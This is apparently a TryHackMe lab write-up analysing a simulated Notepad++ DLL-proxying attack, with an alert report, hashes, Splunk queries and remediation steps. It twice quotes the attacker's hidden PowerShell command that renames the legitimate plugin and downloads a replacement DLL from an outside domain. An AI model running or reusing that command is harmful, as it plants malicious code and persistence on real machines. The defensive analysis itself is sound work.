<h1 align="center">T1574</h1>
<p align="center">Execution ㆍ Hijack Execution Flow<br>
<img width="605px" src="https://github.com/user-attachments/assets/93ec75f9-7024-4be7-b515-af0033ebf96f"><br>
If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://githubhttps://github.com/user-attachments/assets/f9d56f26-bf87-4309-b5d8-f98cbb0302b0com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20MAY%2013-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a><br><br></p>


```bash
Time of activity: 
-  2026-05-14 02:14:08.443

List of Affected Entities: 
-  User Affected: tryhatmestudios\liam.patel
-  Computer Affected: THM-DEV-WS.tryhatmestudios.thm

Reason for Classifying as True Positive: 
-  At 2026-05-14 02:14:08.443, the threat actor created 'NppExport.dll' with the hashes 'SHA1=CFE9F4DB02CB3E2BCE16069F5DDCFA49E9E0B4A7,MD5=005C22FB47240F1FD6F14A4FBB765D72,SHA256=7DC1FA6F812F2F606C5C288B41D7C55AA33391456F9E6FFA80F05467C07B7E24,IMPHASH=6F732D7AD4583751627CFDC1BF6BE116' spawned by 'powershell.exe'.
-  At the exact same timestamp '2026-05-14 02:14:08.443' , they exported the plugin  for Notepad++, (a free (GNU) source code editor): 'C:\Program Files\Notepad++\plugins\NppExport\original-NppExport.dll' was loaded with hashes 'SHA1=9F2EDF3FE147E4EB5110F8FF61A2DA060FB9CE22,MD5=90EF54798796A5746E5F1DB9E09836E1,SHA256=5F72CF8DC0E9AC8CDEC0D466EB1F769348FF0FACD685A42F7A657D127F1532F7,IMPHASH=17FF9A294F3152C5C744802081C5E1C4'.
 -  At '2026-05-14 02:13:21.443', user 'liam.patel' downloaded and executed a trojanized application 'Unreal_Engine_5.5_Beta_Features.exe'. This application acted as the initial dropper by spawning a hidden PowerShell process to carry out the file replacement.
-  The threat actor created 'StartupProfileData-NonInteractive' in 'C:\Users\liam.patel\AppData\Local\Microsoft\Windows\PowerShell\' using  'powershell.exe'.
-  They  executed command line 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"&amp; {[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$t='C:\\Program Files\\Notepad++\\plugins\\NppExport';$o=\\\"$t\\NppExport.dll\\\";if(!(Test-Path $t)){New-Item -ItemType Directory -Path $t -Force|Out-Null};cd $t;if(Test-Path 'NppExport.dll'){Rename-Item 'NppExport.dll' -NewName 'original-NppExport.dll' -Force};Invoke-WebRequest -Uri 'http://unreal-engine-resources.net/NppExport.dll' -OutFile $o -UseBasicParsing}\'
-  The threat actor navigated to the directory 'C:\Program Files\Notepad++\plugins\NppExport\'. They renamed the legitimate plugin file from 'NppExport.dll' to 'original-NppExport.dll'.
-  This is confirmed by the log entry showing 'original-NppExport.dll' still retains the legitimate OriginalFileName 'NppExport.dll' and Description 'Export Plugin for Notepad++'.
-  The threat actor placed their malicious payload in the same directory, naming it 'NppExport.dll' to match the expected plugin name. The user 'liam.patel' executes 'notepad++.exe'.
-  One second later, the application blindly loads the malicious 'NppExport.dll'. The malicious nature of this file is identified because its 'Description' and 'OriginalFileName' fields are null '--', indicating it lacks standard developer version metadata and is an unsigned binary.
-  The malicious DLL automatically loads 'original-NppExport.dll'.
-  To prevent Notepad++ from crashing and alerting the user, the attacker's DLL acts as a proxy, executing its malicious code in the background while simultaneously forwarding all legitimate application calls to the original, renamed DLL.
-  Next the application is executed a second time, and the exact same loading sequence occurs. This confirms the attacker has successfully established persistence; the malicious code will execute every time the user opens Notepad++ for daily tasks.

Reason for Escalating the Alert: 
-  This attack highlights two critical failures in the current security posture. First, Access Control Policies failed; standard users have write permissions to the 'C:\Program Files\Notepad++\plugins\' directory, allowing the threat actor to drop the payload without administrative privileges. Second, Application Execution Policies are either misconfigured or absent, as the system permitted the execution of an unsigned, unverified DLL hash originating from an untrusted external domain 'unreal-engine-resources.net'.
-  Analysis of the malicious 'NppExport.dll' yielded the SHA256 hash '7DC1FA6F812F2F606C5C288B41D7C55AA33391456F9E6FFA80F05467C07B7E24'. This file was verified as malicious by comparing it directly against to 'original-NppExport.dll' within the local environment. The mismatch confirms the active plugin was replaced. Furthermore, the internal Sysmon logs confirm the executing file lacks standard developer metadata 'Description' and 'OriginalFileName' equal to '--' and is an unsigned binary, proving it is not the legitimate plugin.
-  A successful DLL Proxying attack has established active persistence on 'THM-DEV-WS'.
-  This indicates an ongoing and uncontained compromise.
-  Escalation to Incident Response is immediately required because the threat actor is currently operating within the user's context.
-  This creates a critical risk of credential harvesting (e.g., LSASS memory dumping), lateral movement across the domain, and active Command and Control (C2) communication.

Recommended Remediation Actions: 
-  Host Isolation: Isolate the machine immediately. Since the threat actor has established persistence via plugin replacement, they likely have an active Command and Control (C2) channel.
-  Terminate Malicious Processes: Identify and terminate any persistent loaders or orphaned child processes (e.g., cmd.exe, powershell.exe, or encoded beacons) that were spawned by the malicious DLL during the initial load.
-  Credential Rotation: Reset liam.patel's credentials across the domain. DLL side-loading often leads to LSASS memory dumping or token theft once the malicious code is running in the user's context.
-  Eradicate Persistence & Secure Permissions: Delete unauthorized DLLs in 'C:\Program Files\Notepad++\plugins\'. Harden ACLs: Remove Write and Modify permissions for the Users group on the Notepad++ directory. Ensure only SYSTEM and Administrators have write access.
-  Update to Latest Version: Upgrade to the latest official version (e.g., v8.9.2 or newer).

List of Attack Indicators:
-  Image: 'C:\Program Files\Notepad++\notepad++.exe'
-  DLL (Persistence): 'C:\Program Files\Notepad++\plugins\NppExport\NppExport.dll' with Hashes: 'SHA1=CFE9F4DB02CB3E2BCE16069F5DDCFA49E9E0B4A7,MD5=005C22FB47240F1FD6F14A4FBB765D72,SHA256=7DC1FA6F812F2F606C5C288B41D7C55AA33391456F9E6FFA80F05467C07B7E24,IMPHASH=6F732D7AD4583751627CFDC1BF6BE116'
-  DLL Hash (SHA256), 'NppExport.dll': '7DC1FA6F812F2F606C5C288B41D7C55AA33391456F9E6FFA80F05467C07B7E24'
-  DLL Hash (SHA256), 'original-NppExport.dll': 
-  Renamed Legitimate DLL (Proxy): 'C:\Program Files\Notepad++\plugins\NppExport\original-NppExport.dll' with Hashes: 'SHA1=9F2EDF3FE147E4EB5110F8FF61A2DA060FB9CE22,MD5=90EF54798796A5746E5F1DB9E09836E1,SHA256=5F72CF8DC0E9AC8CDEC0D466EB1F769348FF0FACD685A42F7A657D127F1532F7,IMPHASH=17FF9A294F3152C5C744802081C5E1C4'
-  Initial Dropper/Vector:  'Unreal_Engine_5.5_Beta_Features.exe'
-  Network IOCs:  Payload Delivery URL: [http://unreal-engine-resources.net/NppExport.dll](http://unreal-engine-resources.net/NppExport.dll) (Domain: 'unreal-engine-resources.net') 
-  'powershell.exe'.
-  'C:\Program Files\Notepad++\plugins\NppExport\original-NppExport.dll'
- 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"&amp; {[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$t='C:\\Program Files\\Notepad++\\plugins\\NppExport';$o=\\\"$t\\NppExport.dll\\\";if(!(Test-Path $t)){New-Item -ItemType Directory -Path $t -Force|Out-Null};cd $t;if(Test-Path 'NppExport.dll'){Rename-Item 'NppExport.dll' -NewName 'original-NppExport.dll' -Force};Invoke-WebRequest -Uri 'http://unreal-engine-resources.net/NppExport.dll' -OutFile $o -UseBasicParsing}\'
```

<p align="center"><img width="605px" src="https://github.com/user-attachments/assets/e561472d-5f63-44c8-8e1a-c6c0982bca4e"><br>


<img width="1336" height="579" alt="image" src="https://github.com/user-attachments/assets/ea0c173e-ac4c-42df-994a-6313161951d7" />


<img width="1322" height="591" alt="image" src="https://github.com/user-attachments/assets/929ec94c-f119-4cc3-bd22-fef0a153072d" />

```bash
index=* "*THM-DEV-WS*" "*NppExport.dll"
| table _time, EventCode, Image, User, ImageLoaded, OriginalFileName
|  sort by +_time
```

<img width="1348" height="555" alt="image" src="https://github.com/user-attachments/assets/6df88bbd-1879-4e54-9a26-7f9df8ee0505" />


```bash
index=* "*THM-DEV-WS*" ""
| table _time, EventCode, Image, User, ImageLoaded, OriginalFileName
|  sort by +_time
```

<img width="1302" height="557" alt="image" src="https://github.com/user-attachments/assets/e99d13eb-48a3-4141-b180-1431f565c77b" />


```bash
index=* host="THM-DEV-WS" ImageLoaded="*NppExport.dll" | table _time, ImageLoaded, Hashes
```

```bash
index=* host="THM-DEV-WS" EventCode=11 TargetFilename="*NppExport.dll" | table _time, Image, TargetFilename, User
```

<h2 align="center">My TryHackMe Journey &nbsp; · &nbsp; 2026, May</h2>
<div align="center"><h6>

|Day<br><br><br> |Capability<br>Score<br><br>|Room<br>Name<br><br>|Level<br><br><br>|Type<br><br><br>|Rooms<br>Completed<br><br>|Points<br><br><br>|Badges<br><br><br>|Global<br>All<br>Time<br>|Global<br>Monthly<br><br>|Brazil<br>All<br>Time<br>|Brazil<br>Monthly<br><br>|
|---------------:|-----------------:|:----------------|:---------------|:----------------------------------------:|-------------------------:|-----------------:|-----------------:|--------------------:|------------------------:|--------------------:|---------------:|
|13<br><br>  |109<br><br>   |T1574<br><br>|Medium<br><br>   |🔗<br><br>| 1,208<br><br>| 175,758<br><br>| 95<br><br>| 7ᵗʰ<br><br>| 26ᵗʰ<br><br>| 1ˢᵗ<br><br>| 1ˢᵗ<br><br>|

</h6></div><br>
